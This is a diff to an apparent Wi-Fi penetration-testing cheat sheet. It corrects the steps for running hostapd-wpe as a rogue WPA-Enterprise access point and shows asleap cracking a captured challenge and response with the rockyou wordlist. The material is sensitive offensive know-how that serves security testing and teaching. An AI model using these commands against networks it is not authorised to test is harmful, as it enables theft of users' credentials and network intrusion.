@@ -62,8 +62,10 @@ kali@kali:~$ airdecap-ng -b <BSSID> -e <ESSID> -p <key> capture-01.cap
 ## WPA-Enterprise (AUTH MGT)
 ```shell
 ### First, update hostapd-wpe.conf with correct INTERFACE, CHANNEL, SSID
+kali@kali:~$ nano /etc/hostapd-wpe/hostapd-wpe.conf
+
 # Run HostAPD-WPE
-kali@kali:~$ /etc/hostapd-wpe/hostapd-wpe.conf
+kali@kali:~$ sudo hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf
 
 # Run ASLEAP command from HostAPD output e.g.
 kali@kali:~$ asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4 -W /usr/share/wordlists/rockyou.txt
